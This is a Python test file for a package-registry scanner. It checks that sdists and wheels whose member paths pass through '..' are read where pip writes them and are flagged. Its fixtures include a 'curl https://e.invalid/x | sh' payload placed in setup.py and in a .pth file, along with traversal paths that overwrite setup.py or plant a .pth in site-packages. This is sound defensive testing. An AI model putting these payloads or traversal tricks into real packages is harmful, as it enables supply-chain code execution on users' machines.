"""BR-4, F-11: an sdist's and a wheel's member names read the way pip reads them.

pip resolves the `..` of an sdist's member (tarfile writes `pkg-1.0/x/../setup.py` through the path, as setup.py,
over the one before it) and of a wheel's (its installer writes each file at the path's normpath, so `x/../evil.pth`
is a .pth file in site-packages). The scan refused such a member as an unsafe path, MAJOR, and never read it: a
release whose setup.py pip runs was WARN, which the guard installs. Now the member is read where pip writes it, with
an SC-ARCHIVE-PATH of its own. A `..` that leaves the folder makes pip refuse the archive, and the scan reads none.

pip takes an sdist's top folder off only when every member has the same one (its `has_leading_dir`); otherwise it
writes each member under its whole name, where the scan takes the first folder off every name. Such an archive, and
one whose top folder is `.`, is corrupt: INCOMPLETE. The archives build tools write read the same both ways.

Where pip is importable here, each sdist is also unpacked by pip's own code, to show what pip writes. Payloads are
inert: hosts are .invalid, and nothing is installed or run."""
import io
import os
import shutil
import tarfile
import tempfile
import unittest
import zipfile

from lazaret.registry import repo
from tests.registry._review_support import issues, scan_bytes

SETUP = b"from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
EVIL_SETUP = b"import os\nos.system('curl https://e.invalid/x | sh')\n" + SETUP
EVIL_PTH = b"import os; os.system('curl https://e.invalid/x | sh')\n"
PKG_INFO = b"Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n"


def sdist(*members, fmt=tarfile.PAX_FORMAT):
    """A .tar.gz of (name, bytes) members, in order; a name ending in `/` is a folder."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=fmt) as tf:
        for name, data in members:
            info = tarfile.TarInfo(name.rstrip("/"))
            if name.endswith("/"):
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def zipped(*members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members:
            zf.writestr(name, data)
    return buf.getvalue()


def corrupt(data, container="tgz", artifact="sdist"):
    return [m.detail for m in repo.iter_archive(data, container, artifact) if m[3] == "corrupt"]


def read(data, container="tgz", artifact="sdist"):
    """{path: bytes} the scan reads (the last member read under a path)."""
    return {m[0]: bytes(m[2]) for m in repo.iter_archive(data, container, artifact) if m[3] is None}


def pip_unpacking():
    try:
        from pip._internal.utils import unpacking
    except Exception:                                # (pip is not importable here)
        return None
    return unpacking


def pip_writes(data, suffix=".tar.gz"):
    """{path: bytes} pip's own code writes from this sdist (None when pip is not importable here, {} when pip
    refuses it)."""
    unpacking = pip_unpacking()
    if unpacking is None:
        return None
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "pkg-1.0" + suffix)
        with open(path, "wb") as fh:
            fh.write(data)
        out = os.path.join(d, "out")
        try:
            unpacking.unpack_file(path, out)
        except Exception:
            return {}
        written = {}
        for root, _dirs, files in os.walk(out):
            for name in files:
                full = os.path.join(root, name)
                if os.path.isfile(full) and not os.path.islink(full):
                    with open(full, "rb") as fh:
                        written[os.path.relpath(full, out).replace(os.sep, "/")] = fh.read()
        return written


class DotDotTests(unittest.TestCase):
    """A member whose path goes through `..`: read where pip writes it, or refused when it leaves the folder."""

    def test_an_sdist_setup_py_through_dotdot(self):
        # pip writes the second setup.py over the first and runs it when it builds; the scan read the first only
        data = sdist(("pkg-1.0/PKG-INFO", PKG_INFO), ("pkg-1.0/setup.py", SETUP), ("pkg-1.0/x/a.py", b"\n"),
                     ("pkg-1.0/x/../setup.py", EVIL_SETUP))
        res = scan_bytes(data, artifact="sdist", eco="pypi")
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertTrue(issues(res, "SC-INSTALL-HOOK"))
        paths = issues(res, "SC-ARCHIVE-PATH")
        self.assertEqual([i["name"] for i in paths], ["Archive path through '..'"])
        self.assertIn("pip installs it as 'setup.py'", paths[0]["msg"])
        self.assertTrue(issues(res, "SC-ARCHIVE-DUP"))
        written = pip_writes(data)
        if written is not None:
            self.assertEqual(written.get("setup.py"), EVIL_SETUP)

    def test_a_dotdot_that_leaves_the_folder(self):
        # pip refuses the archive; the scan reads nothing there either
        data = sdist(("pkg-1.0/setup.py", SETUP), ("pkg-1.0/../evil.py", EVIL_SETUP))
        self.assertNotIn(EVIL_SETUP, read(data).values())
        res = scan_bytes(data, artifact="sdist", eco="pypi")
        self.assertEqual([i["name"] for i in issues(res, "SC-ARCHIVE-PATH")], ["Unsafe archive path"])
        self.assertIn(pip_writes(data), (None, {}))

    def test_a_zip_sdist_through_dotdot(self):
        data = zipped(("pkg-1.0/PKG-INFO", PKG_INFO), ("pkg-1.0/setup.py", SETUP), ("pkg-1.0/x/../setup.py", EVIL_SETUP))
        self.assertEqual(read(data, "zip")["setup.py"], EVIL_SETUP)
        res = scan_bytes(data, container="zip", artifact="sdist", eco="pypi")
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        written = pip_writes(data, ".zip")
        if written is not None:
            self.assertEqual(written.get("setup.py"), EVIL_SETUP)

    def test_a_wheel_pth_through_dotdot(self):
        # pip's installer writes a wheel's file at its normpath: a .pth file at the top of site-packages
        data = zipped(("pkg/__init__.py", b"VALUE = 1\n"), ("pkg/x/__init__.py", b"\n"), ("x/../evil.pth", EVIL_PTH),
                      ("pkg-1.0.dist-info/METADATA", PKG_INFO))
        self.assertEqual(read(data, "zip", "wheel").get("evil.pth"), EVIL_PTH)
        res = scan_bytes(data, container="zip", artifact="wheel", eco="pypi")
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertTrue(issues(res, "SC-PTH-EXEC"))
        self.assertIn("pip installs it as 'evil.pth'", issues(res, "SC-ARCHIVE-PATH")[0]["msg"])

    def test_a_wheel_data_path_through_dotdot(self):
        # pip takes the scheme from the path's normpath: purelib, the top of site-packages
        data = zipped(("pkg/__init__.py", b"VALUE = 1\n"), ("pkg-1.0.data/x/../purelib/evil.pth", EVIL_PTH),
                      ("pkg-1.0.dist-info/METADATA", PKG_INFO))
        self.assertEqual(read(data, "zip", "wheel").get("pkg-1.0.data/purelib/evil.pth"), EVIL_PTH)
        res = scan_bytes(data, container="zip", artifact="wheel", eco="pypi")
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_other_installers_still_refuse_it(self):
        # node-tar, cargo's tar, go and VS Code's yauzl refuse a `..`: the member stays unread there
        for artifact, name in (("npm", "package/x/../a.js"), ("vsix", "extension/x/../a.js"),
                               ("action", "repo-1/x/../a.js"), (None, "p/x/../a.js")):
            with self.subTest(artifact=artifact):
                self.assertEqual(repo.canonical_member_path(name, artifact), (None, "path contains '..'"))
        self.assertEqual(repo.canonical_member_path("pkg-1.0/x/../setup.py", "sdist"), ("setup.py", None))
        self.assertEqual(repo.canonical_member_path("x/../a/b.py", "wheel"), ("a/b.py", None))
        self.assertEqual(repo.canonical_member_path("a/../../b.py", "wheel"), (None, "path contains '..'"))


class TopFolderTests(unittest.TestCase):
    """pip takes an sdist's top folder off only when every member has the same one."""

    def check(self, data, needle, container="tgz"):
        found = corrupt(data, container)
        self.assertTrue(any(needle in d for d in found), found)
        res = scan_bytes(data, container=container, artifact="sdist", eco="pypi")
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])
        self.assertTrue(any(needle in i["msg"] for i in issues(res, "SC-TRUNCATED")), issues(res, "SC-TRUNCATED"))

    def test_members_without_one_top_folder(self):
        # pip writes pkg-1.0/pkg/__init__.py and runs the top-level setup.py; the scan read pkg/__init__.py, where
        # the setup.py's `import pkg` finds nothing that pip writes
        data = sdist(("setup.py", SETUP), ("pkg-1.0/pkg/__init__.py", b"x = 1\n"))
        self.check(data, "do not all sit in one top folder")
        written = pip_writes(data)
        if written is not None:
            self.assertEqual(sorted(written), ["pkg-1.0/pkg/__init__.py", "setup.py"])

    def test_a_dot_top_folder(self):
        # every name starts with ./: pip takes the `.` off and writes pkg-1.0/setup.py, the scan read setup.py
        data = sdist(("./pkg-1.0/setup.py", SETUP), ("./pkg-1.0/pkg/__init__.py", b"x = 1\n"))
        self.check(data, "pip takes only '.' off the front of each name")
        written = pip_writes(data)
        if written is not None:
            self.assertIn("pkg-1.0/setup.py", written)

    def test_a_zip_sdist_without_one_top_folder(self):
        data = zipped(("setup.py", SETUP), ("pkg-1.0/pkg/__init__.py", b"x = 1\n"))
        self.check(data, "do not all sit in one top folder", "zip")

    def test_a_folder_entry_counts_too(self):
        # pip reads every member's name, folders too: a lone folder of another name is enough
        data = sdist(("other/", b""), ("pkg-1.0/setup.py", SETUP), ("pkg-1.0/pkg/__init__.py", b"x = 1\n"))
        self.check(data, "do not all sit in one top folder")


class AgreementTests(unittest.TestCase):
    """The archives build tools write, and odd names pip and the scan place alike: no disagreement."""

    def agree(self, data, container="tgz", suffix=".tar.gz"):
        self.assertEqual(corrupt(data, container), [])
        written = pip_writes(data, suffix)
        if written is not None:
            self.assertEqual(written, read(data, container))

    def test_a_usual_sdist(self):
        self.agree(sdist(("pkg-1.0/", b""), ("pkg-1.0/PKG-INFO", PKG_INFO), ("pkg-1.0/setup.py", SETUP),
                         ("pkg-1.0/pkg/__init__.py", b"x = 1\n"), ("pkg-1.0/pkg/data/a.json", b"{}\n")))

    def test_a_ustar_and_a_gnu_sdist(self):
        long_name = "pkg-1.0/" + "d" * 120 + "/m.py"
        for fmt in (tarfile.USTAR_FORMAT, tarfile.GNU_FORMAT):
            with self.subTest(fmt=fmt):
                self.agree(sdist(("pkg-1.0/setup.py", SETUP), (long_name, b"y = 2\n"), fmt=fmt))

    def test_absolute_names_under_one_top_folder(self):
        # pip takes the slashes and the top folder off (from 24.1; pip 24.0 refuses the archive)
        data = sdist(("/pkg-1.0/setup.py", SETUP), ("/pkg-1.0/pkg/__init__.py", b"x = 1\n"))
        self.assertEqual(corrupt(data), [])
        self.assertEqual(sorted(read(data)), ["pkg/__init__.py", "setup.py"])

    def test_backslashes(self):
        # pip splits the top folder off at a backslash too; the scan reads a backslash as a slash
        data = sdist(("pkg-1.0\\setup.py", SETUP), ("pkg-1.0\\pkg\\__init__.py", b"x = 1\n"))
        self.assertEqual(corrupt(data), [])
        self.assertEqual(sorted(read(data)), ["pkg/__init__.py", "setup.py"])

    def test_a_lone_top_level_file(self):
        # its own name is the one top folder to pip, which writes nothing of it; the scan reads it: more than pip
        # writes, never less, so no disagreement
        for data, container in ((sdist(("a.py", b"x = 1\n")), "tgz"), (zipped(("a.py", b"x = 1\n")), "zip")):
            with self.subTest(container=container):
                self.assertEqual(corrupt(data, container), [])
                self.assertEqual(sorted(read(data, container)), ["a.py"])

    def test_a_usual_zip_sdist(self):
        self.agree(zipped(("pkg-1.0/PKG-INFO", PKG_INFO), ("pkg-1.0/setup.py", SETUP),
                          ("pkg-1.0/pkg/__init__.py", b"x = 1\n")), "zip", ".zip")


class SplitTests(unittest.TestCase):
    """The scan's reading of pip's split_leading_dir and has_leading_dir, against pip's own where it is here."""

    NAMES = ["pkg-1.0/setup.py", "pkg-1.0", "/pkg-1.0/a", "\\pkg-1.0\\a", "pkg-1.0\\a/b", "pkg-1.0/a\\b", "./a",
             ".", "", "/", "a", "//a/b", "\\/a", "a/", "a\\"]

    def test_split(self):
        unpacking = pip_unpacking()
        for name in self.NAMES:
            with self.subTest(name=name):
                ours = repo._pip_split_leading_dir(name)
                self.assertEqual(len(ours), 2)
                if unpacking is not None:
                    self.assertEqual(ours, unpacking.split_leading_dir(name))
        self.assertEqual(repo._pip_split_leading_dir("pkg-1.0\\a/b"), ["pkg-1.0", "a/b"])
        self.assertEqual(repo._pip_split_leading_dir("/pkg-1.0/a"), ["pkg-1.0", "a"])

    def test_has_leading_dir(self):
        unpacking = pip_unpacking()
        groups = [["a/b", "a/c", "a"], ["a/b", "b/c"], ["./a", "./b"], ["a", "b"], ["/a/x", "a\\y"], ["", "a/b"],
                  ["a/b"], []]
        for names in groups:
            with self.subTest(names=names):
                ours = repo._pip_has_leading_dir(names)
                if unpacking is not None:
                    self.assertEqual(ours, unpacking.has_leading_dir(names))
        self.assertTrue(repo._pip_has_leading_dir(["a/b", "a"]))
        self.assertFalse(repo._pip_has_leading_dir(["a/b", "b/c"]))


if __name__ == "__main__":
    unittest.main()
